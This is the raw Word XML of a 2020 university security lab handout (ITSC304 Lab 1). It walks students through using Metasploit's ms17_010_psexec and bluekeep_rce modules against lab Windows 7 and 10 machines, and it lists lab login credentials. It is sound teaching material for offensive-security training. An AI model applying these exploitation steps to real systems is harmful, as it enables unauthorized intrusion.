          <w:b/>
        </w:rPr>
        <w:t>msf5&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00410AB3">
        <w:t xml:space="preserve"> metasploit console. U</w:t>
      </w:r>
      <w:r w:rsidR="00EC3F6B">
        <w:t xml:space="preserve">se metasploit </w:t>
      </w:r>
      <w:r w:rsidR="0046555B" w:rsidRPr="00D068A9">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>search</w:t>
      </w:r>
      <w:r w:rsidR="0046555B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EC3F6B">
        <w:t xml:space="preserve">command to search for </w:t>
      </w:r>
      <w:r w:rsidR="0046555B">
        <w:t>eternalromance</w:t>
      </w:r>
      <w:r w:rsidR="00DB0BEB">
        <w:t xml:space="preserve"> another exploit developed after eternalblue. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C2971C" w14:textId="72ACEF85" w:rsidR="00D068A9" w:rsidRDefault="00D068A9" w:rsidP="00D068A9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>U</w:t>
      </w:r>
      <w:r w:rsidR="00DB0BEB">
        <w:t xml:space="preserve">se the exploit: </w:t>
      </w:r>
      <w:r w:rsidR="00DB0BEB" w:rsidRPr="00D068A9">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>exploit/windows/smb/ms17_010_psexec</w:t>
      </w:r>
      <w:r w:rsidR="00DB0BEB">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6DC530" w14:textId="77777777" w:rsidR="00D068A9" w:rsidRDefault="00D068A9" w:rsidP="00D068A9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r w:rsidRPr="000F62B0">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>info</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command to find details about this exploit </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C2F943" w14:textId="5B7F99D8" w:rsidR="00FE6D05" w:rsidRDefault="00DB0BEB" w:rsidP="00D068A9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Configure the required options and exploit </w:t>
      </w:r>
      <w:r w:rsidR="00B76B63">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Windows </w:t>
      </w:r>
      <w:r w:rsidR="00D068A9">
        <w:t xml:space="preserve">7 </w:t>
      </w:r>
      <w:r>
        <w:t>machine</w:t>
      </w:r>
      <w:r w:rsidR="00D068A9">
        <w:t xml:space="preserve">. Notice that this exploit requires a named pipe to connect. It requires validation to SMB database you need to configure SMBUser </w:t>
      </w:r>
      <w:r w:rsidR="00FB0076">
        <w:t xml:space="preserve">(ITSCvictim2) </w:t>
      </w:r>
      <w:r w:rsidR="00D068A9">
        <w:t>and SMBPass</w:t>
      </w:r>
      <w:r w:rsidR="00FB0076">
        <w:t xml:space="preserve"> (Victim2) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B51C0E" w14:textId="63F98C26" w:rsidR="00D068A9" w:rsidRDefault="00D068A9" w:rsidP="00D068A9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE2BE5">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Attach a screen capture</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that demos meterpreter’s commands used and the compromised system information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7782895C" w14:textId="2EACBA73" w:rsidR="00EB7313" w:rsidRDefault="00EB7313" w:rsidP="00EB7313">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0F58E375" wp14:editId="6FE49172">
            <wp:extent cx="5943600" cy="2276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14:paraId="6193846B" w14:textId="40C4D5F8" w:rsidR="00DB0BEB" w:rsidRDefault="00DB0BEB" w:rsidP="00DB0BEB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1069"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0826FD4B" w14:textId="762648BE" w:rsidR="00940644" w:rsidRDefault="000F62B0" w:rsidP="003D62AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(5</w:t>
      </w:r>
      <w:r w:rsidRPr="000F62B0">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> marks)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EC3F6B">
        <w:t xml:space="preserve">Use metasploit </w:t>
      </w:r>
      <w:r w:rsidR="00EC3F6B" w:rsidRPr="00EC3F6B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>search</w:t>
      </w:r>
      <w:r w:rsidR="00EC3F6B">
        <w:t xml:space="preserve"> command to search for 2019 bluekeep exploit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A5621C" w14:textId="1831457F" w:rsidR="00EC3F6B" w:rsidRDefault="00EC3F6B" w:rsidP="00EC3F6B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Make Windows 7 vulnerable to </w:t>
      </w:r>
      <w:r w:rsidRPr="009118F1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>remote desktop protocol (RDP) port 3389.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A21611" w14:textId="1322EDB2" w:rsidR="00EC3F6B" w:rsidRDefault="00EC3F6B" w:rsidP="00EC3F6B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Verify if </w:t>
      </w:r>
      <w:r w:rsidR="00F8720C">
        <w:t xml:space="preserve">port </w:t>
      </w:r>
      <w:r>
        <w:t>3389 is open. Once the port is open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6D0FBC" w14:textId="3D156771" w:rsidR="00EC3F6B" w:rsidRDefault="00EC3F6B" w:rsidP="00EC3F6B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use windows rdp exploit called bluekeep_rce</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F4956E" w14:textId="1F9B0644" w:rsidR="00EC3F6B" w:rsidRDefault="00EC3F6B" w:rsidP="00EC3F6B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Set required exploit and payload options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="069BBC7F" w14:textId="320EF98A" w:rsidR="00EC3F6B" w:rsidRPr="00F8720C" w:rsidRDefault="00EC3F6B" w:rsidP="00EC3F6B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r w:rsidR="00F8720C" w:rsidRPr="00F8720C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>show targets</w:t>
      </w:r>
      <w:r w:rsidR="00F8720C">
        <w:t xml:space="preserve"> and use the </w:t>
      </w:r>
      <w:r w:rsidR="00F8720C" w:rsidRPr="00F8720C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:r w:rsidRPr="00F8720C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F8720C">
        <w:t xml:space="preserve">command to set </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">the right target in this case is a Virtualbox </w:t>
      </w:r>
      <w:r w:rsidR="00F8720C">
        <w:t xml:space="preserve">:    </w:t>
      </w:r>
      <w:r w:rsidR="00F8720C" w:rsidRPr="00F8720C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>set target  2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7213B69C" w14:textId="2101BCBB" w:rsidR="00F8720C" w:rsidRPr="00F8720C" w:rsidRDefault="00F8720C" w:rsidP="00EC3F6B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Exploit the vulnerable Windows 7 machine. Use sysinfo and shell meterpreter commands. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D6AF5F" w14:textId="4FC7E5B6" w:rsidR="00F8720C" w:rsidRDefault="00F8720C" w:rsidP="00F8720C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE2BE5">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Attach a screen capture</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that demos meterpreter’s commands used and the compromised system information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C46171" w14:textId="3AD8602D" w:rsidR="007A5D26" w:rsidRDefault="007A5D26" w:rsidP="007A5D26">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="628625E6" wp14:editId="42B52850">
            <wp:extent cx="5410200"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10200" cy="2362200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7FA56A" w14:textId="40245FBB" w:rsidR="009118F1" w:rsidRDefault="00B95362" w:rsidP="009118F1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(5</w:t>
      </w:r>
      <w:r w:rsidRPr="000F62B0">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> marks)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009118F1">
        <w:t xml:space="preserve">Try to use metasploit to exploit a Windows 10 machine. </w:t>
      </w:r>
      <w:r w:rsidR="001C5208">
        <w:t xml:space="preserve">You can dowmload Windows10 machine from </w:t>
      </w:r>
      <w:r w:rsidR="005F6054">
        <w:t>OneDrive login as</w:t>
      </w:r>
      <w:r w:rsidR="001C5208">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="005F6054">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005F6054" w:rsidRPr="001C5208">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ITSCstudent </w:t>
      </w:r>
      <w:r w:rsidR="005F6054">
        <w:t>password</w:t>
      </w:r>
      <w:r w:rsidR="001C5208">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="005F6054">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005F6054" w:rsidRPr="001C5208">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Victim3</w:t>
      </w:r>
      <w:r w:rsidR="005F6054">
        <w:t xml:space="preserve">. This machine  is older version build 10586 and more vulnerable or you can use your own vulnerable machine </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B605D3" w14:textId="1595FC45" w:rsidR="00B95362" w:rsidRDefault="00B95362" w:rsidP="009118F1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Research what exploits can be applied to Windows 10 machine. Try one of the exploits on Windows 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DBE4989" w14:textId="0F0A34BD" w:rsidR="009118F1" w:rsidRDefault="009118F1" w:rsidP="009118F1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use auxiliary to verify if the machine is</w:t>
      </w:r>
      <w:r w:rsidR="00B95362">
        <w:t xml:space="preserve"> vulnerable to the exploit you selected</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00B95362">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557FE022" w14:textId="1F158974" w:rsidR="008A480D" w:rsidRDefault="009118F1" w:rsidP="009118F1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use  </w:t>
      </w:r>
      <w:r w:rsidR="00B95362" w:rsidRPr="00B95362">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>set dbgtrace true</w:t>
      </w:r>
      <w:r w:rsidR="00B95362">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="00B95362" w:rsidRPr="00B95362">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>set verbose 1</w:t>
      </w:r>
      <w:r w:rsidR="00B95362">
        <w:t xml:space="preserve"> to debug the process of exploiting the machine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9E1325" w14:textId="72D82191" w:rsidR="00B95362" w:rsidRDefault="00B95362" w:rsidP="009118F1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Attach the screen capture that demos the try or successful exploitation on Windows 10 machine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0387F423" w14:textId="67D41743" w:rsidR="00F8720C" w:rsidRDefault="00F8720C" w:rsidP="00F8720C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FE810B1" w14:textId="058D15FE" w:rsidR="00B95362" w:rsidRDefault="00005BA3" w:rsidP="00F8720C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="60CBA322" wp14:editId="2AC533F8">
            <wp:extent cx="4200525" cy="12857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5987" cy="1290471"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D5232D" w14:textId="77777777" w:rsidR="00B95362" w:rsidRDefault="00B95362" w:rsidP="00F8720C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12D8EE26" w14:textId="77777777" w:rsidR="00F8720C" w:rsidRDefault="00F8720C" w:rsidP="00F8720C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5ACFDCCB" w14:textId="77777777" w:rsidR="00940644" w:rsidRPr="009A10B1" w:rsidRDefault="00940644" w:rsidP="00940644">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1069"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="486E48EF" w14:textId="77777777" w:rsidR="002C6AA7" w:rsidRDefault="002C6AA7" w:rsidP="00E14ADB">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49F0CEEB" w14:textId="77777777" w:rsidR="002C6AA7" w:rsidRDefault="002C6AA7" w:rsidP="00E14ADB">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="363EDBE6" w14:textId="77777777" w:rsidR="002C6AA7" w:rsidRDefault="002C6AA7" w:rsidP="00E14ADB">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03293315" w14:textId="77777777" w:rsidR="00694C89" w:rsidRDefault="00694C89" w:rsidP="00E026F5"/>
    <w:p w14:paraId="65943E5C" w14:textId="77777777" w:rsidR="00694C89" w:rsidRDefault="00694C89" w:rsidP="00E026F5">
      <w:pPr>
        <w:sectPr w:rsidR="00694C89" w:rsidSect="00512D26">
          <w:headerReference w:type="default" r:id="rId47"/>
          <w:footerReference w:type="default" r:id="rId48"/>
          <w:headerReference w:type="first" r:id="rId49"/>
          <w:footerReference w:type="first" r:id="rId50"/>
          <w:pgSz w:w="12240" w:h="15840" w:code="1"/>
          <w:pgMar w:top="1872" w:right="1440" w:bottom="1152" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:titlePg/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D177E7F" w14:textId="23AEDED9" w:rsidR="00433B33" w:rsidRPr="001B0A05" w:rsidRDefault="00433B33" w:rsidP="00017FD6"/>
    <w:sectPr w:rsidR="00433B33" w:rsidRPr="001B0A05" w:rsidSect="00512D26">
      <w:headerReference w:type="first" r:id="rId51"/>
      <w:footerReference w:type="first" r:id="rId52"/>
      <w:pgSz w:w="12240" w:h="15840" w:code="1"/>
      <w:pgMar w:top="1872" w:right="1440" w:bottom="115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A6C4A" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2B57">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F9083C" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2B57"/>
    <w:p w14:paraId="5CBDA5DC" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2B57"/>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="384A1078" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2B57">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C668C1C" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2B57"/>
    <w:p w14:paraId="5519D0B5" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2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tillium">
    <w:altName w:val="Calibri"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="modern"/>
    <w:notTrueType/>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 w:name="Titillium Bd">
    <w:altName w:val="Calibri"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="modern"/>
    <w:notTrueType/>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005EB8"/>
        <w:insideH w:val="single" w:sz="18" w:space="0" w:color="005EB8"/>
        <w:insideV w:val="single" w:sz="18" w:space="0" w:color="005EB8"/>
      </w:tblBorders>
      <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
    </w:tblPr>
    <w:tblGrid>
      <w:gridCol w:w="1090"/>
      <w:gridCol w:w="9422"/>
    </w:tblGrid>
    <w:tr w:rsidR="00123EC6" w:rsidRPr="00A70299" w14:paraId="1C15721F" w14:textId="77777777" w:rsidTr="00D64AFA">
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="918" w:type="dxa"/>
        </w:tcPr>
        <w:p w14:paraId="722DA5C6" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRPr="001E692B" w:rsidRDefault="00123EC6" w:rsidP="00900BDB">
          <w:pPr>
            <w:pStyle w:val="PageNo"/>
          </w:pPr>
          <w:r w:rsidRPr="001E692B">
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidRPr="001E692B">
            <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
          </w:r>
          <w:r w:rsidRPr="001E692B">
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="001C5208">
            <w:rPr>
              <w:noProof/>
            </w:rPr>
            <w:t>16</w:t>
          </w:r>
          <w:r w:rsidRPr="001E692B">
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:tc>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="7938" w:type="dxa"/>
        </w:tcPr>
        <w:p w14:paraId="4034A279" w14:textId="4CDF3F27" w:rsidR="00123EC6" w:rsidRPr="00A70299" w:rsidRDefault="00123EC6" w:rsidP="0078734A">
          <w:pPr>
            <w:pStyle w:val="Footer"/>
          </w:pPr>
          <w:r>
            <w:t>ITSC304</w:t>
          </w:r>
          <w:r w:rsidRPr="00A70299">
            <w:t xml:space="preserve">: </w:t>
          </w:r>
          <w:r>
            <w:t>Lab 1</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="40BC8A61" w14:textId="7F7E0DD5" w:rsidR="00123EC6" w:rsidRPr="00A70299" w:rsidRDefault="00123EC6" w:rsidP="00900BDB">
          <w:pPr>
            <w:pStyle w:val="Copyright"/>
          </w:pPr>
          <w:r>
            <w:t>© 2020, Southern Alberta Institute of Technology</w:t>
          </w:r>
        </w:p>
      </w:tc>
    </w:tr>
  </w:tbl>
  <w:p w14:paraId="30BAB2F1" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRPr="00900BDB" w:rsidRDefault="00123EC6" w:rsidP="00900B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005EB8"/>
        <w:insideH w:val="single" w:sz="18" w:space="0" w:color="005EB8"/>
        <w:insideV w:val="single" w:sz="18" w:space="0" w:color="005EB8"/>
      </w:tblBorders>
      <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
    </w:tblPr>
    <w:tblGrid>
      <w:gridCol w:w="970"/>
      <w:gridCol w:w="8390"/>
    </w:tblGrid>
    <w:tr w:rsidR="00123EC6" w:rsidRPr="00A70299" w14:paraId="543F3E41" w14:textId="77777777" w:rsidTr="00D64AFA">
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="918" w:type="dxa"/>
        </w:tcPr>
        <w:p w14:paraId="27ECEF91" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRPr="001E692B" w:rsidRDefault="00123EC6" w:rsidP="0088153E">
          <w:pPr>
            <w:pStyle w:val="PageNo"/>
          </w:pPr>
          <w:r w:rsidRPr="001E692B">
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidRPr="001E692B">
            <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
          </w:r>
          <w:r w:rsidRPr="001E692B">
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="001C5208">
            <w:rPr>
              <w:noProof/>
            </w:rPr>
            <w:t>2</w:t>
          </w:r>
          <w:r w:rsidRPr="001E692B">
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:tc>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="7938" w:type="dxa"/>
        </w:tcPr>
        <w:p w14:paraId="0680D839" w14:textId="00C7AE06" w:rsidR="00123EC6" w:rsidRPr="00A70299" w:rsidRDefault="00123EC6" w:rsidP="003D1B25">
          <w:pPr>
            <w:pStyle w:val="Footer"/>
          </w:pPr>
          <w:r>
            <w:t>ITSC304</w:t>
          </w:r>
          <w:r w:rsidRPr="00A70299">
            <w:t xml:space="preserve">: </w:t>
          </w:r>
          <w:r>
            <w:t>Lab 1</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="2CCD1F87" w14:textId="425A8726" w:rsidR="00123EC6" w:rsidRPr="00A70299" w:rsidRDefault="00123EC6" w:rsidP="0088153E">
          <w:pPr>
            <w:pStyle w:val="Copyright"/>
          </w:pPr>
          <w:r>
            <w:t>© 2020, Southern Alberta Institute of Technology</w:t>
          </w:r>
        </w:p>
      </w:tc>
    </w:tr>
  </w:tbl>
  <w:p w14:paraId="3104E230" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRPr="0088153E" w:rsidRDefault="00123EC6" w:rsidP="008815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F802A" w14:textId="2ED9EE73" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00017FD6">
    <w:r>
      <w:t>© 2020, Southern Alberta Institute of Technology. All rights reserved.</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="6B81DECE" w14:textId="232C2329" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00017FD6">
    <w:r>
      <w:t>This publication and materials herein are protected by applicable intellectual property laws.</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="65B9C7A0" w14:textId="130561B0" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00017FD6">
    <w:r>
      <w:t>Unauthorized reproduction and distribution of this publication in whole or part is prohibited.</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="6F4DB428" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00017FD6"/>
  <w:p w14:paraId="508159DB" w14:textId="5B791053" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00017FD6">
    <w:r>
      <w:t>For more information, contact:</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="0D60F3E3" w14:textId="56AB9BBB" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00017FD6">
    <w:r>
      <w:t>Director, Centre for Instructional Technology and Development</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="4E741738" w14:textId="6D12960E" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00017FD6">
    <w:r>
      <w:t>Southern Alberta Institute of Technology</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="10822D5A" w14:textId="73CAE1C3" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00017FD6">
    <w:r>
      <w:t>1301 16 Ave. N.W., Calgary, AB T2M 0L4</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="7D139869" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00017FD6"/>
  <w:p w14:paraId="4943EC27" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRPr="0088153E" w:rsidRDefault="00123EC6" w:rsidP="00017F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ECD4A" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2B57">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="50468A2A" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2B57"/>
    <w:p w14:paraId="3D2F57E2" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2B57"/>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="4DB47C03" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2B57">
      <w:r>
        <w:continuationSeparator/>
